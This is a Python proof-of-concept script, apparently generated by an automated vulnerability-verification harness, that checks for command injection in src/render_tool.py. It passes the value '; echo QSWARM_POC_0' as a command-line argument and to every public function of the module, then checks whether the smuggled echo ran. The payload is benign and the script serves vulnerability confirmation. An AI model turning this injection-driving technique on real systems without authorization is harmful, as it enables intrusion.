"PoC（模板生成）：src/render_tool.py:8 命令注入复现（D39 harness 契约）——双级驱动"
import os
import subprocess
import sys
import tempfile

REPO = os.environ.get("REPO", ".")
target = os.path.join(REPO, 'src/render_tool.py')
marker = "QSWARM_POC_0"
hits = []

# ① argv 直跑（sink 在模块顶层/直接消费 argv 的形态；payload 为拼接形态）
proc = subprocess.run(
    [sys.executable, target, "; echo " + marker],
    capture_output=True, text=True, timeout=60,
)
blob = (proc.stdout or "") + (proc.stderr or "")
if marker in blob:
    hits.append("argv")
    print("ASSERT|injection_payload_executed|PASS|stage=argv marker=" + marker)
else:
    print("ASSERT|injection_payload_executed|FAIL|stage=argv")

# ② import 驱动（sink 在模块函数内的形态，如 run(cmd)/render(path)）：
#    dup2 捕获 os.system 继承的 fd1；遍历模块公共函数 × 拼接/直传 payload 变体。
if "argv" not in hits:
    try:
        import importlib.util

        spec = importlib.util.spec_from_file_location("qswarm_poc_target", target)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        fns = [
            getattr(mod, n) for n in sorted(dir(mod))
            if callable(getattr(mod, n)) and not n.startswith("_")
            and getattr(getattr(mod, n), "__module__", "") == "qswarm_poc_target"
        ]
        if not fns:
            raise RuntimeError("no public callable in target module")
        cap = tempfile.TemporaryFile()
        fd_backup = os.dup(1)
        argv_backup = list(sys.argv)
        got = False
        try:
            os.dup2(cap.fileno(), 1)
            for fn in fns:
                for payload in ("; echo " + marker, "echo " + marker):
                    sys.argv = [target, payload]   # sink 经 sys.argv 取污点的形态
                    try:
                        fn(payload)
                    except TypeError:
                        try:
                            fn()
                        except Exception:  # noqa: BLE001 — 单函数失败继续
                            pass
                    except Exception:  # noqa: BLE001 — 单函数失败继续
                        pass
                    finally:
                        sys.argv = argv_backup
                    sys.stdout.flush()
                    cap.seek(0)
                    if marker in cap.read().decode("utf-8", "replace"):
                        got = True
                        break
                    cap.seek(0, 2)
                if got:
                    break
        finally:
            sys.argv = argv_backup
            os.dup2(fd_backup, 1)
            os.close(fd_backup)
            cap.close()
        if got:
            hits.append("import")
            print("ASSERT|injection_payload_executed|PASS|stage=import marker="
                  + marker)
            sys.exit(0)
        print("ASSERT|injection_payload_executed|FAIL|stage=import")
        sys.exit(1)
    except Exception as exc:  # noqa: BLE001 — 驱动失败如实 FAIL
        print("ASSERT|injection_payload_executed|FAIL|stage=import err="
              + type(exc).__name__)
        sys.exit(1)

sys.exit(0)
